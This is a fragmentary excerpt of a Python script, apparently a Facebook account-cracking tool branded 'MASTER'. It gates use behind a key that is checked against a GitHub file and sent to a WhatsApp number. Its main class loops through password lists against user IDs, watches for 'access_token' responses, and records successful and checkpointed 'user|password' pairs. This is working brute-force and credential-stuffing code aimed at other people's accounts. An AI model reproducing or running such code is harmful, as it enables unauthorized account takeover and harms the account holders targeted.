...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/AhMasterbd/ah/main/Approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        os.system('clear')
        os.system('xdg-open https://youtube.com/hakimstudio')
        logo()
        print('')
        ...
        os.system('am start https://wa.me/+01755866216?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20MASTER-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+01755866216?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : ABDUL HAKIM 😁");time.sleep (0.03)
    print("             [*]. FACEBOOK   : ABDUL HAKIM");time.sleep (0.03)
    print("             [*]. GITHUB     :AHMASTERBD");time.sleep (0.03)   
...
class __bsn__:
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-MASTER] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [MASTER] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
